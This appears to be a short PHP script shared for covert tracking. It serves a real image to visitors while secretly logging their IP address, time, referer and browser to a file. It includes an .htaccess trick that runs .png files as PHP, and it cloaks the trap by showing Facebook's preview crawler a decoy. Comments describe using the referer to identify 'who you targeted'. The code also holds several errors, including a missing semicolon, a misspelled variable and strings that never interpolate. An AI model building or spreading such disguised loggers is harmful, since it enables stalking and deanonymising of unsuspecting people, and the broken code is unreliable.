<?php
//creditz 2 @typhoid
//FB edition
//--IMPORTANT-- put this in .htmlaccess without quotation marks " AddType application/x-httpd-php .png "
//replace h were it says .png in the line added to the htmlaccess with 
//whatever you  save this php file as. if you're keeping it as it is then save this logger file as .png on the server
//special thanks to ozkar  
extract($_SERVER);


//open jpg image and set it as the display for the page. can use other image type but must be different than the extension put into htmlaccess
$name = 'picturename.jpg';
//replace this with file of choice. could be super low quality blurry copy of picturename.jpg or textfile saying preview not available idk
$zuckerberg = 'fggt.txt'
if($HTTP_USER_AGENT =='facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)')
{
// change 'r' below to rb if using another picture instead of a text file
$fp = fopen($zuckerberg,'r');

}
else {$fp = fopen($name, 'rb');
}

header("Content-Type: image/png");
header("Content-Length: " . filesize($name));
fpassthru($fp);
flock($fp, 3); 

fclose($fp);


//log visitors ip to log.html
$file = fopen('log.html', 'a');
//time
stime = date('H:i dS F');
fwrite ($file, '<b>Time:</b> $time<br/>');
//ip address
fwrite($file, '<b> Ip Address:</b> $REMOTE_ADDR<br/>');
//show referer so you can set up multiple pages of these to record to same log and use referer to help identify who you targeted
fwrite($file, '<b>Referer:</b> $HTTP_REFFERER<br/>');
//browser details
fwrite($file, '<b>Browser:</b> $HTTP_USER_AGENT<hr/>');
fclose($file);
?>
